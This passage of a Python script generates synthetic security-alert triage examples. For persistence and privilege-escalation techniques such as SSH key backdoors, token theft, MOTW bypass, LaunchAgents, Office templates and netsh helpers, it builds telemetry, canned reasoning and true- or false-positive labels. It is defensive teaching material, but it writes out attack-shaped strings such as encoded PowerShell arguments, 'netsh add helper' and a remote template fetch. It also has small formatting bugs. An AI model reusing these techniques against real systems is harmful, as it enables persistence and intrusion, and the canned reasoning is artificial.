        "T1014 -- AUTHORIZED OBSERVABILITY TOOL. Monitor for session end.",
        action="monitor",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 18. AuthorizedKeysBackdoor
#     Evidence: Write to ~/.ssh/authorized_keys outside of key management system,
#               new public key added without corresponding provisioning event,
#               immediate successful SSH login with new key from unknown IP
#     Admin FP: IT provisioning SSH access via centralized key management
# ═══════════════════════════════════════════════════════════════════════════════

def _akb_tp(i):
    paths = ["/root/.ssh/authorized_keys", f"/home/{_user()}/.ssh/authorized_keys",
             "/etc/ssh/authorized_keys/root"]
    p = {"host":_host(),"target_user":_user(),"path":random.choice(paths),
         "key_type":random.choice(["ssh-rsa","ssh-ed25519","ecdsa-sha2-nistp256"]),
         "key_comment":random.choice(["root@attacker","kali","no-comment","backup-key"]),
         "written_by":random.choice(["bash","python3","curl","perl"]),
         "login_from":_ip_ext(),"login_time_after_write_s":random.randint(5,120)}
    prompt = (f"Linux Sentinel + Network Tap -- SSH Authorized Key Backdoor.\n"
              f"Host: {p['host']}  Target User: {p['target_user']}\n"
              f"  file_written: {p['path']}\n"
              f"  key_type: {p['key_type']}  key_comment: {p['key_comment']}\n"
              f"  written_by_process: {p['written_by']}\n"
              f"  provisioning_event_in_idm: NO\n"
              f"  successful_ssh_login_from: {p['login_from']}\n"
              f"  seconds_from_write_to_login: {p['login_time_after_write_s']}")
    cot = _cot(
        "Authorized SSH key provisioning flows through an Identity Management system "
        "(AD, Okta, HashiCorp Vault) with an audit trail. Direct writes to authorized_keys "
        "by shell processes with no corresponding IdM event have no legitimate admin purpose.",
        f"authorized_keys written by {p['written_by']} (not an IdM provisioning tool). "
        f"provisioning_event_in_idm=NO (not an authorized key deployment). "
        f"key_comment='{p['key_comment']}' (attacker-supplied comment). "
        f"Successful SSH login from {p['login_from']} within {p['login_time_after_write_s']}s of write -- "
        "attacker immediately used the backdoor key.",
        f"Host {p['host']}: attacker has persistent SSH access via backdoor key. "
        "Survives password changes. Login from any IP with the private key.",
        "SSH authorized_keys backdoor confirmed -- key added without IdM event, immediate use.",
        "MITRE T1098.004 (Account Manipulation: SSH Authorized Keys). "
        "Remove backdoor key, rotate SSH keys for all users, audit login history.",
    )
    return prompt, cot, "true_positive"

def _akb_fp(i):
    p = {"path": "/home/deploy/.ssh/authorized_keys",
         "tool": "HashiCorp Vault SSH Secret Engine",
         "idm_event": "YES", "ticket": f"OPS-{random.randint(100,999)}"}
    prompt = (f"Linux Sentinel -- SSH Key Provisioning.\n"
              f"  file_written: {p['path']}\n"
              f"  written_by: vault-agent  provisioning_event_in_idm=YES\n"
              f"  tool={p['tool']}  ticket={p['ticket']}  key_ttl=24h")
    cot = _cot(
        "Vault SSH Secret Engine provisioning short-lived key via vault-agent -- IdM event, ticketed, 24h TTL.",
        f"vault-agent (authorized provisioning tool). IdM event=YES. Ticket. TTL=24h (auto-expires).",
        "Authorized SSH key provisioning via Vault -- IdM event, vault-agent, time-limited key.",
        "Authorized SSH key deployment via Vault. No action.",
        "T1098.004 -- AUTHORIZED KEY PROVISIONING. Key auto-expires in 24h.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 19. TokenImpersonation (SweetPotato / Potato family / PrintSpoofer)
#     Evidence: OpenProcess+DuplicateTokenEx+CreateProcessWithTokenW API sequence,
#               child process spawned with SYSTEM token from user-mode parent,
#               BITS/WinRM/EfsRpc/PrintSpooler trigger for token capture,
#               EventID 4672 (Special Privileges) with unexpected logon session
#     Admin FP: None -- no legitimate admin use case outside security tools
# ═══════════════════════════════════════════════════════════════════════════════

def _ti_tp(i):
    triggers = ["BITS service (CLSID 4991D34B)","WinRM local auth","EfsRpc CreateFile","PrintSpooler trigger"]
    outputs  = ["cmd.exe (SYSTEM)","powershell.exe (SYSTEM)","reverse_shell_svc.exe (SYSTEM)"]
    p = {"host":_host(),"src_user":_user(),"src_token":"SERVICE",
         "trigger":random.choice(triggers),"output":random.choice(outputs),
         "event_4672":True,"logon_session_type":"Network (type 3) despite local trigger",
         "duplicated_token":"NT AUTHORITY\\SYSTEM"}
    prompt = (f"Windows Host -- Token Impersonation / Privilege Escalation.\n"
              f"Host: {p['host']}  Source User: {p['src_user']} ({p['src_token']} token)\n"
              f"  trigger_mechanism: {p['trigger']}\n"
              f"  API_sequence: OpenProcess → OpenProcessToken → DuplicateTokenEx → CreateProcessWithTokenW\n"
              f"  result_token: {p['duplicated_token']}\n"
              f"  spawned_process: {p['output']}\n"
              f"  EventID_4672: {p['event_4672']} (Special Privileges Assigned)\n"
              f"  logon_session_anomaly: {p['logon_session_type']}")
    cot = _cot(
        "Token impersonation via BITS/WinRM/EFS/PrintSpooler is an exploitation technique. "
        "No legitimate admin operation requires duplicating a SYSTEM token from a user-level "
        "process context. Administrators use sudo/runas for elevation, not token duplication.",
        f"API sequence OpenProcess→DuplicateTokenEx→CreateProcessWithTokenW -- definitional token theft. "
        f"Trigger={p['trigger']} (known impersonation vector). "
        f"Result: {p['duplicated_token']} token in {p['output']}. "
        f"EventID 4672 with type-3 logon anomaly confirms SYSTEM impersonation. "
        "From SERVICE account to SYSTEM is a lateral privilege escalation in Windows privilege hierarchy.",
        f"Host {p['host']}: attacker escalated from {p['src_token']} to SYSTEM. "
        "All subsequent activity runs with highest OS privilege. "
        "Service and kernel-level actions now available to attacker.",
        "Token impersonation privilege escalation confirmed -- SERVICE to SYSTEM.",
        "MITRE T1134.001 (Access Token Manipulation: Token Impersonation/Theft). "
        "Kill spawned SYSTEM process, isolate host, audit all actions since escalation.",
    )
    return prompt, cot, "true_positive"

def _ti_fp(i):
    p = {"tool": "Sysinternals PsExec", "context": "IT remote admin session",
         "ticket": f"CHG-{random.randint(10000,99999)}", "user": "CORP\\svc-it-admin"}
    prompt = (f"Windows Host -- Elevated Process Creation.\n"
              f"  ParentProcess: PsExec.exe  SpawnedProcess: cmd.exe (SYSTEM)\n"
              f"  account={p['user']}  context={p['context']}\n"
              f"  change_ticket={p['ticket']}  psexec_signed=YES")
    cot = _cot(
        "PsExec used by IT admin service account for remote management session -- signed tool, IT account, ticket.",
        f"PsExec (Sysinternals, signed). account=svc-it-admin (IT service account). Ticket {p['ticket']}.",
        "Authorized IT remote administration session -- signed tool, service account, change ticket.",
        "Authorized IT remote admin via PsExec -- signed, IT account, ticket.",
        "T1134 -- AUTHORIZED ADMIN SESSION. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 20. ContainerMOTWBypass
#     Evidence: ISO/VHD/IMG file downloaded, auto-mount event (new drive letter),
#               executable launched from mounted container without MOTW,
#               Zone.Identifier ADS absent on inner files
#     Admin FP: Legitimate software distributed as ISO (vendor-signed)
# ═══════════════════════════════════════════════════════════════════════════════

def _cmb_tp(i):
    containers = [
        ("ISO", f"invoice_{random.randint(10000,99999)}.iso", random.choice(["invoice.exe","update.exe","setup.exe"])),
        ("VHD", f"software_update_{random.randint(100,999)}.vhd", random.choice(["activate.exe","license.exe"])),
        ("IMG", f"document_{random.randint(10000,99999)}.img", random.choice(["resume.exe","contract.exe"])),
    ]
    ctype, cfile, payload = random.choice(containers)
    p = {"host":_host(),"user":_user(),"container_type":ctype,"container_file":cfile,
         "payload":payload,"download_src":_ip_ext(),"drive_letter":random.choice("DEFGHIJKLM"),
         "motw_on_container":"Zone.Identifier ZoneId=3",
         "motw_on_payload":"ABSENT (MOTW not propagated by Windows for ISO/VHD)",
         "execution_blocked":False}
    prompt = (f"Windows Host -- Container MOTW Bypass (Payload Delivery).\n"
              f"Host: {p['host']}  User: {p['user']}\n"
              f"  container_file: {p['container_file']} ({p['container_type']})\n"
              f"  downloaded_from: {p['download_src']}\n"
              f"  auto_mounted_drive: {p['drive_letter']}:\\\n"
              f"  payload_executed: {p['drive_letter']}:\\{p['payload']}\n"
              f"  MOTW_on_container: {p['motw_on_container']}\n"
              f"  MOTW_on_payload: {p['motw_on_payload']}\n"
              f"  SmartScreen_blocked: {p['execution_blocked']} (MOTW absent = no SmartScreen check)")
    cot = _cot(
        "Legitimate software ISO files from vendors are signed with EV certificates, "
        "have the vendor's code-signing cert on all executables, and come from known "
        "distribution servers (Microsoft Update, adobe.com). "
        "A social-engineering filename (invoice, resume, contract) as an ISO is not a vendor distribution.",
        f"{p['container_type']} file '{p['container_file']}' from {p['download_src']}. "
        f"Container has MOTW (ZoneId=3 -- internet-sourced). "
        "When Windows mounts the container, inner files inherit NO MOTW -- "
        "bypassing SmartScreen and Office Protected View on all files inside. "
        f"Payload '{p['payload']}' executed without SmartScreen check. "
        "Filename suggests social engineering delivery (invoice, contract, etc.).",
        f"Host {p['host']}: {p['container_type']}-based MOTW bypass executed. "
        "Payload ran without SmartScreen warning. Initial access established.",
        "Container-based MOTW bypass confirmed -- ISO/VHD social engineering delivery.",
        "MITRE T1553.005 (Subvert Trust Controls: Mark-of-the-Web Bypass). "
        "Kill payload process, isolate host, block download source.",
    )
    return prompt, cot, "true_positive"

def _cmb_fp(i):
    p = {"file": "Windows11_23H2_x64.iso", "src": "microsoft.com",
         "signed": True, "cert": "Microsoft Corporation"}
    prompt = (f"Windows Host -- ISO File Download and Mount.\n"
              f"  file: {p['file']}\n"
              f"  download_source: {p['src']}\n"
              f"  all_inner_files_signed={p['signed']}  publisher={p['cert']}\n"
              f"  filename_matches_vendor_naming=YES")
    cot = _cot(
        "Microsoft OS image ISO from microsoft.com -- all binaries signed by Microsoft Corporation.",
        f"source=microsoft.com. All inner files signed by {p['cert']}. Vendor naming convention.",
        "Authorized Microsoft OS distribution via ISO -- signed, vendor source.",
        "Authorized OS ISO from Microsoft. No action.",
        "T1553.005 -- AUTHORIZED VENDOR ISO. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 21. MacOSLaunchPersistence
#     Evidence: New plist in ~/Library/LaunchAgents/ or /Library/LaunchDaemons/,
#               binary lacks valid code signature, quarantine flag absent,
#               LaunchAgent runs on every user login
#     Admin FP: Signed vendor app adding LaunchAgent (documented, signed)
# ═══════════════════════════════════════════════════════════════════════════════

def _mac_tp(i):
    paths = [
        (f"~/Library/LaunchAgents/com.{random.choice(['apple','google','adobe'])}.{random.randint(100,999)}.plist", "user-level"),
        ("/Library/LaunchDaemons/com.system.{random.randint(100,999)}.plist", "system-level"),
    ]
    plist_path, scope = random.choice(paths)
    p = {"host":_host(),"user":_user(),"plist":plist_path,"scope":scope,
         "exec_path":random.choice([f"/tmp/.{random.randint(100,999)}",
                                    f"/Users/{_user()}/.config/daemon",
                                    "/var/folders/svc"]),
         "code_signed":False,"quarantine":False,"run_at_load":True,
         "network_conn":_ip_ext() if i%2==0 else None}
    prompt = (f"macOS Sensor -- LaunchAgent/Daemon Persistence.\n"
              f"Host: {p['host']}  User: {p['user']}\n"
              f"  plist_created: {p['plist']}\n"
              f"  scope: {p['scope']}\n"
              f"  ProgramArguments: {p['exec_path']}\n"
              f"  RunAtLoad: {p['run_at_load']}\n"
              f"  code_signed: {p['code_signed']}\n"
              f"  quarantine_flag: {p['quarantine']}\n"
              + (f"  outbound_connection: {p['network_conn']}\n" if p['network_conn'] else ""))
    cot = _cot(
        "Legitimate vendor LaunchAgents have code-signed binaries in /Applications/ or /usr/local/, "
        "carry the quarantine flag if downloaded, and are listed in the vendor's install documentation. "
        "An unsigned binary in /tmp/ or user config directories is not a vendor LaunchAgent.",
        f"plist in {p['plist']} ({p['scope']} persistence). "
        f"ProgramArguments={p['exec_path']} (non-standard path). "
        f"code_signed=False (vendor apps are always signed on macOS). "
        f"quarantine=False (was never flagged as internet download, or flag was stripped). "
        f"RunAtLoad=True (executes on every login). "
        + (f"Outbound C2 connection to {p['network_conn']}." if p['network_conn'] else ""),
        f"Host {p['host']}: unsigned binary will execute on every user login. "
        "macOS Gatekeeper bypassed by missing quarantine flag. "
        "This is a common post-exploitation persistence mechanism on macOS.",
        "macOS LaunchAgent/Daemon persistence confirmed -- unsigned binary + non-standard path.",
        "MITRE T1543.001 (Create or Modify System Process: Launch Agent). "
        "Remove plist, delete binary, check login items, run KnockKnock scan.",
    )
    return prompt, cot, "true_positive"

def _mac_fp(i):
    p = {"plist": "~/Library/LaunchAgents/com.dropbox.dropbox.plist",
         "exec": "/Applications/Dropbox.app/Contents/MacOS/Dropbox",
         "signed": True, "cert": "Dropbox, Inc."}
    prompt = (f"macOS Sensor -- LaunchAgent Registration.\n"
              f"  plist: {p['plist']}\n"
              f"  ProgramArguments: {p['exec']}\n"
              f"  code_signed={p['signed']}  publisher={p['cert']}\n"
              f"  quarantine_flag=YES  installed_via_pkg=YES")
    cot = _cot(
        "Dropbox LaunchAgent with signed binary in /Applications/ -- standard vendor persistence.",
        f"exec=/Applications/ (vendor path). Signed by {p['cert']}. Quarantine flag present. pkg installer.",
        "Authorized vendor LaunchAgent -- signed, /Applications, quarantine flag.",
        "Authorized vendor LaunchAgent from Dropbox. No action.",
        "T1543.001 -- AUTHORIZED VENDOR LAUNCH AGENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# ExcelAddInPersistence (from Macro/Backdoor-ExcelAddIn.ps1)
#   Evidence: .xlam/.xll file written to XLSTART path (EventID 11) + unsigned
#             DLL loaded by excel.exe from add-in path (EventID 7) at startup
#             outside %ProgramFiles% -- executed on every Excel open
#   Admin FP: IT-deployed corporate Excel add-in (signed DLL, %ProgramFiles%
#             path, corporate PKI cert, deployment ticket)
# ═══════════════════════════════════════════════════════════════════════════════

def _eap_tp(i):
    xlstart_paths = [
        f"C:\\Users\\{_user()}\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\",
        f"C:\\Users\\{_user()}\\AppData\\Local\\Microsoft\\Excel\\XLSTART\\",
        "C:\\ProgramData\\Microsoft\\Excel\\XLSTART\\",
    ]
    ext       = random.choice([".xlam",".xll",".dll"])
    filename  = f"{''.join(random.choices('abcdefghijklmnop',k=7))}{ext}"
    xlstart   = random.choice(xlstart_paths)
    full_path = xlstart + filename
    host      = _host()
    user      = _user()
    dropper   = random.choice(["powershell.exe","cmd.exe","wscript.exe","WINWORD.EXE"])

    prompt = (f"Windows Host Telemetry -- Excel Add-In Persistence.\n"
              f"Host: {host}  User: {user}\n"
              f"  phase_1: sysmon_event_id=11 (FileCreate)\n"
              f"    Image: {dropper}  TargetFilename: {full_path}\n"
              f"    file_extension={ext}  written_to_xlstart=YES\n"
              f"  phase_2: sysmon_event_id=7 (ImageLoaded) on next Excel launch\n"
              f"    Image: excel.exe  ImageLoaded: {full_path}\n"
              f"    Signed: false  SignatureStatus: Unsigned\n"
              f"    load_path_outside_program_files=YES\n"
              f"  persistence_trigger=every_excel_open  user_interaction_required=NO")

    cot = _cot(
        f"Legitimate Excel add-ins deployed by IT are placed in %ProgramFiles% or "
        "a centrally managed share, signed by the corporate PKI, and deployed via SCCM with a "
        "change ticket. User-writable XLSTART paths should never contain unsigned DLLs or .xlam "
        "files written by a shell interpreter or Office macro.",
        f"{dropper} wrote {filename} to XLSTART path ({xlstart}). "
        f"File is {ext} (Excel add-in format) -- automatically loaded on every Excel open. "
        f"Sysmon EventID 7: excel.exe loads {full_path} -- Signed=false, unsigned DLL. "
        "Execution is automatic and silent -- no user interaction required after initial drop.",
        f"Host {host} ({user}): malicious Excel add-in will execute on every Excel launch. "
        "Persistence survives reboots and user session changes.",
        "Excel add-in persistence confirmed -- unsigned .xlam/.xll dropped to XLSTART by shell process.",
        "MITRE T1137.006 (Office Application Startup: Add-ins). "
        "Remove add-in file from XLSTART, audit other user profiles on this host, "
        "trace dropper process chain to initial access.",
    )
    return prompt, cot, "true_positive"

def _eap_fp(i):
    addin_name = random.choice(["Bloomberg.xlam","PowerPivot.dll","DocuSign-Excel.xlam"])
    prompt = (f"Windows Host Telemetry -- Corporate Excel Add-In Deployment.\n"
              f"  sysmon_event_id=11  Image: MsiExec.exe  "
              f"TargetFilename: C:\\Program Files\\ExcelAddIns\\{addin_name}\n"
              f"  sysmon_event_id=7  Image: excel.exe  ImageLoaded: same path\n"
              f"  Signed: true  SignatureStatus: Valid  SignatureIssuer: corp-pki-ca\n"
              f"  installed_by=svc-sccm  deployment_ticket=CHG-{random.randint(10000,99999)}\n"
              f"  path_in_program_files=YES")
    cot = _cot(
        f"Corporate Excel add-in {addin_name} deployed by SCCM to %ProgramFiles% -- signed "
        "by corporate PKI, installed by service account, change ticket.",
        "Signed=true, corp-pki-ca issuer. Path=%ProgramFiles% (not user-writable XLSTART). "
        "Installed by svc-sccm. Change ticket. MsiExec.exe parent (SCCM deployment).",
        "Authorized corporate Excel add-in deployment -- signed, %ProgramFiles%, SCCM.",
        f"Corporate Excel add-in {addin_name} -- signed, %ProgramFiles%, SCCM change ticket.",
        "T1137.006 -- AUTHORIZED CORPORATE ADD-IN. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# HotkeyLNKChain (from pwsh-scripts/Create-HotKeyLNK.ps1)
#   Evidence: LNK file created with HotKey field populated (not zero/null) pointing
#             to cmd/powershell/rundll32, placed in user-accessible execution path
#             (startup folder, SendTo, or user-writable location) -- executes on
#             any user keypress matching the registered hotkey
#   Admin FP: User creating a normal application shortcut with hotkey
#             (target is a legitimate app in %ProgramFiles%, signed)
# ═══════════════════════════════════════════════════════════════════════════════

def _hlk_tp(i):
    payloads   = ["powershell.exe -enc","cmd.exe /c","rundll32.exe","mshta.exe","wscript.exe"]
    lnk_targets= ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                  "C:\\Windows\\System32\\cmd.exe","C:\\Windows\\System32\\rundll32.exe"]
    hotkeys    = ["Ctrl+Alt+X","Ctrl+Shift+F12","Alt+F10","Ctrl+Alt+Del+proxy"]
    lnk_paths  = [
        f"C:\\Users\\{_user()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
        f"C:\\Users\\{_user()}\\AppData\\Roaming\\Microsoft\\Windows\\SendTo\\",
        f"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
    ]
    payload    = random.choice(payloads)
    target     = random.choice(lnk_targets)
    hotkey     = random.choice(hotkeys)
    lnk_path   = random.choice(lnk_paths)
    lnk_name   = f"{''.join(random.choices('abcdefghijklmnop',k=8))}.lnk"
    dropper    = random.choice(["powershell.exe","wscript.exe","cmd.exe","python.exe"])
    host       = _host()
    user       = _user()

    prompt = (f"Windows Host Telemetry -- Hotkey LNK Persistence.\n"
              f"Host: {host}  User: {user}\n"
              f"  sysmon_event_id=11 (FileCreate)\n"
              f"  Image: {dropper}  TargetFilename: {lnk_path}{lnk_name}\n"
              f"  lnk_target: {target}\n"
              f"  lnk_arguments: {payload} <encoded_payload>\n"
              f"  lnk_hotkey_field: {hotkey}  (non-null -- triggers on keypress)\n"
              f"  lnk_placed_in_startup_path: YES\n"
              f"  created_by_shell_process: YES  (not by user via Explorer GUI)")

    cot = _cot(
        "Users creating shortcuts via Explorer GUI do not typically set hotkey fields on "
        "shortcuts pointing to shell interpreters. A hotkey-enabled LNK pointing to cmd.exe "
        "or PowerShell placed in a Startup folder combines two persistence mechanisms: "
        "autorun-on-login AND execution-on-keypress.",
        f"LNK created by {dropper} (shell process, not Explorer GUI). "
        f"Target={target} (shell interpreter). Arguments contain encoded payload. "
        f"HotKey={hotkey} (non-null -- triggers on any session matching this key combo). "
        f"Placed in Startup path (also executes on login). Dual persistence: login + keypress.",
        f"Host {host} ({user}): LNK triggers both on login and on hotkey {hotkey}. "
        "Any user on this machine who presses the key combo will execute the payload.",
        "Hotkey LNK chain persistence confirmed -- shell interpreter target + non-null hotkey + startup path.",
        "MITRE T1547.001 + T1037.001 (Boot Autostart + Logon Initialization Scripts). "
        "Remove LNK file, scan all profiles for similar LNKs with non-null hotkey fields.",
    )
    return prompt, cot, "true_positive"

def _hlk_fp(i):
    app_name = random.choice(["Visual Studio Code","Slack","Teams","Notepad++"])
    hotkey   = random.choice(["Ctrl+Alt+V","Ctrl+Shift+S","Ctrl+Alt+T"])
    prompt = (f"Windows Host Telemetry -- User Shortcut Creation.\n"
              f"  sysmon_event_id=11  Image: Explorer.exe\n"
              f"  TargetFilename: C:\\Users\\{_user()}\\Desktop\\{app_name.replace(' ','')}.lnk\n"
              f"  lnk_target: C:\\Program Files\\{app_name}\\{app_name.lower().replace(' ','')}.exe\n"
              f"  lnk_hotkey_field: {hotkey}\n"
              f"  target_signed=YES  target_in_program_files=YES\n"
              f"  created_by=Explorer.exe  lnk_in_startup_path=NO  (Desktop only)")
    cot = _cot(
        f"User created a Desktop shortcut for {app_name} with a hotkey via Explorer GUI. "
        "Target is a signed application in %ProgramFiles%, not placed in a Startup folder.",
        f"Created by Explorer.exe (user GUI action). Target in %ProgramFiles% (signed app). "
        f"lnk_in_startup_path=NO (Desktop, not autorun). Signed binary target.",
        f"User shortcut creation for {app_name} -- legitimate productivity shortcut.",
        f"User-created Desktop shortcut for {app_name} -- Explorer parent, signed target, not in startup.",
        "T1547.001 -- AUTHORIZED USER SHORTCUT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ── Extension: 3 additional persistence classes ──────────────────────────────

def _netsh_tp(i):
    host = _host(); user = _user()
    dll_path = random.choice([
        f"C:\\Users\\{user}\\AppData\\Local\\Temp\\netsh_helper.dll",
        f"C:\\ProgramData\\{''.join(random.choices('abcdef',k=4))}.dll",
    ])
    prompt = (f"Windows Host Telemetry -- Netsh Helper DLL Persistence.\n"
              f"Host: {host}  User: {user}\n"
              f"  stage_1_install: EventID=1 (Process Create)\n"
              f"    Image: netsh.exe  ParentImage: cmd.exe\n"
              f"    CommandLine: netsh.exe add helper {dll_path}\n"
              f"  stage_2_registry: EventID=13 (Registry Set)\n"
              f"    TargetObject: HKLM\\SOFTWARE\\Microsoft\\NetSh\n"
              f"    Details: {dll_path}  (new entry)\n"
              f"    Signed: false  (unsigned DLL -- not a vendor network component)\n"
              f"  stage_3_trigger: on every netsh.exe execution:\n"
              f"    EventID=7: netsh.exe loads {dll_path} (persistent DLL load)")
    cot = _cot(
        "Netsh helpers are DLL-based extensions loaded by netsh.exe for network "
        "configuration (firewall, IP, WLAN). Legitimate helpers: signed by Microsoft "
        "or network stack vendors (IPsec, DHCP), installed by Windows/vendor setup.",
        f"'netsh add helper {dll_path}' registers DLL in HKLM\\...\\NetSh. "
        f"Unsigned DLL from user-writable path = malicious helper. "
        "Loads on every future netsh.exe execution -- persistent without requiring a "
        "scheduled task, service, or run key. Often missed by persistence scanners.",
        f"Host {host}: Netsh helper persistence installed -- unsigned DLL {dll_path} "
        "loads on every netsh execution.",
        "Netsh helper DLL persistence confirmed -- HKLM NetSh + unsigned DLL.",
        "MITRE T1546.007. Remove registry entry, delete DLL. "
        "Check all netsh helper entries: netsh show helper.",
    )
    return prompt, cot, "true_positive"

def _netsh_fp(i):
    prompt = (f"Windows Host Telemetry -- Authorized Network Component Install.\n"
              f"  EventID=13  TargetObject: HKLM\\SOFTWARE\\Microsoft\\NetSh\n"
              f"    Details: C:\\Windows\\System32\\dhcpcsvc.dll  (signed Microsoft)\n"
              f"    installed_by=Windows_Update  Signed=true\n"
              f"  no_user_writable_path=YES  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        "Windows Update installing signed Microsoft netsh helper -- authorized.",
        "Windows Update. System32 path. Signed by Microsoft. Change ticket.",
        "Authorized netsh helper install -- Microsoft, System32, signed.",
        "Windows netsh helper -- Microsoft, System32, signed, update.",
        "T1546.007 -- AUTHORIZED NETWORK COMPONENT. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


def _scrnsaver_tp(i):
    host = _host(); user = _user()
    scr_path = random.choice([
        f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{''.join(random.choices('abcdef',k=6))}.scr",
        f"C:\\Users\\{user}\\Downloads\\screensaver.scr",
    ])
    prompt = (f"Windows Host Telemetry -- Screensaver Persistence (.SCR as PE).\n"
              f"Host: {host}  User: {user}\n"
              f"  stage_1_drop: EventID=11 (FileCreate)\n"
              f"    Image: powershell.exe  TargetFilename: {scr_path}\n"
              f"  stage_2_persist: EventID=13 (Registry Set)\n"
              f"    TargetObject: HKCU\\Control Panel\\Desktop\\SCRNSAVE.EXE\n"
              f"    Details: {scr_path}  (replaced with malicious .scr file)\n"
              f"  stage_3_trigger: screensaver activates after idle timeout\n"
              f"    EventID=1: {scr_path} executed  (PE executed from user directory)\n"
              f"    .scr_is_pe_executable=YES  no_graphical_screensaver=YES")
    cot = _cot(
        "Screensaver (.scr) files are PE executables. Windows sets the screensaver via "
        "SCRNSAVE.EXE registry key. Legitimate: points to System32 screensavers "
        "(C:\\Windows\\System32\\Bubbles.scr, etc.).",
        f"SCRNSAVE.EXE pointing to {scr_path} (user-writable path, not System32). "
        ".scr file created by PowerShell = PE executable disguised as screensaver. "
        "Executes on idle -- time-delayed execution that appears legitimate.",
        f"Host {host} ({user}): screensaver persistence -- {scr_path} will execute "
        "on next idle timeout.",
        "Screensaver persistence confirmed -- SCRNSAVE.EXE points to user-dir PE.",
        "MITRE T1546.002. Reset SCRNSAVE.EXE to System32 path. Delete {scr_path}.",
    )
    return prompt, cot, "true_positive"

def _scrnsaver_fp(i):
    prompt = (f"Windows Host Telemetry -- Authorized Screensaver Config.\n"
              f"  EventID=13  TargetObject: HKCU\\Control Panel\\Desktop\\SCRNSAVE.EXE\n"
              f"    Details: C:\\Windows\\System32\\Bubbles.scr  (Microsoft System32)\n"
              f"    modified_by=user_via_Control_Panel  (user customization)\n"
              f"  no_user_dir_path=YES  no_PE_download=YES")
    cot = _cot(
        "User changing screensaver via Control Panel -- System32 screensaver, no download.",
        "System32 path. Control Panel context. No download. No user-dir PE.",
        "Authorized screensaver change -- System32 path, Control Panel.",
        "Screensaver change -- System32 scr, Control Panel, no download.",
        "T1546.002 -- AUTHORIZED SCREENSAVER CHANGE. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


def _office_template_tp(i):
    host = _host(); user = _user()
    remote_template = f"http://{_ip_ext()}/template.dotm"
    variants = [
        (f"Word doc contains remote template URL: {remote_template}",
         "remote template injection -- doc downloads macro template on every open"),
        (f"Normal.dotm modified: C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm",
         "Normal.dotm macro injection -- executes on every Word document open"),
    ]
    desc, method = variants[i % len(variants)]
    prompt = (f"Windows Host Telemetry -- Office Template Macro Persistence.\n"
              f"Host: {host}  User: {user}\n"
              f"  stage_1_modify: EventID=11 (FileCreate/Modify)\n"
              f"    Image: powershell.exe  TargetFilename: ...Normal.dotm\n"
              f"    (Normal.dotm written by non-Word, non-IT process)\n"
              f"  stage_2_trigger: EventID=3 (Network Connection) on Word open\n"
              f"    Image: WINWORD.EXE  DestinationIp={_ip_ext()}  DestinationPort=80\n"
              f"    (Word fetching remote .dotm template)\n"
              f"  stage_3_exec: EventID=1 (WINWORD spawning PowerShell)\n"
              f"    Image: powershell.exe  ParentImage: WINWORD.EXE\n"
              f"    (macro from downloaded .dotm executed)\n"
              f"  technique: {desc}\n"
              f"  method: {method}")
    cot = _cot(
        "Office templates (Normal.dotm, XLStart) store default macros. "
        "Legitimate modifications: IT deploying corporate templates via GPO "
        "(signed, NETLOGON or AdminTemplates path).",
        f"Normal.dotm written by PowerShell (not Word, not GPO) = malicious template injection. "
        "Word connecting to external IP on open = remote template download. "
        "PowerShell child from Word = macro in template executing. "
        f"{method} -- activates on every Word document open.",
        f"Host {host} ({user}): Office template persistence -- macro executes on every Word open.",
        "Office template persistence confirmed -- Normal.dotm modified + remote template.",
        "MITRE T1137.001 (Office Application Startup: Office Template Macros). "
        "Restore Normal.dotm from backup. Block remote template URLs.",
    )
    return prompt, cot, "true_positive"

def _office_template_fp(i):
    prompt = (f"Windows Host Telemetry -- IT Corporate Template Deployment.\n"
              f"  EventID=11  TargetFilename: C:\\Users\\...\\Templates\\Normal.dotm\n"
              f"    Image: WINWORD.EXE  (Word updating its own template)\n"
              f"    triggered_by=GPO_template_deployment\n"
              f"  template_source=\\\\NETLOGON\\Templates  (corp share, not internet)\n"
              f"  no_remote_template_URL=YES  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        "IT deploying corporate template via GPO -- Word updating Normal.dotm from NETLOGON, "
        "no internet download, change ticket.",
        "Word writing its own Normal.dotm. GPO source. NETLOGON path. No internet. Change ticket.",
        "Authorized IT template deployment -- GPO, NETLOGON, Word parent.",
        "GPO template deploy -- Word, NETLOGON, no internet, change ticket.",
        "T1137.001 -- AUTHORIZED TEMPLATE DEPLOY. No action.", action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# Add on (2026-06-05)
# ═══════════════════════════════════════════════════════════════════════════════

def _ado_persist_tp(i):
    p = {"src": _ip_ext(),
         "operation": random.choice([
             "service_connection_secret_read",
             "pipeline_yaml_modification",
             "variable_group_secret_access",
             "personal_access_token_creation"]),
         "project": random.choice(["infra-deploy","prod-release","main-pipeline","k8s-deploy"]),
         "token": "Bearer personal_access_token",
         "off_hours": True}
    prompt = (f"Azure DevOps Audit -- Pipeline Persistence/Backdoor.\n"
              f"Source: {p['src']}\n"
              f"  operation={p['operation']}\n"
              f"  target_project={p['project']}\n"
              f"  auth_method={p['token']}\n"
              f"  off_hours=YES")
    cot = _cot(
        "DevOps engineers modify pipelines and service connections during sprint work. "
        f"Off-hours {p['operation']} on a production deployment pipeline from an "
        "external IP is not sprint work.",
        f"operation={p['operation']}: "
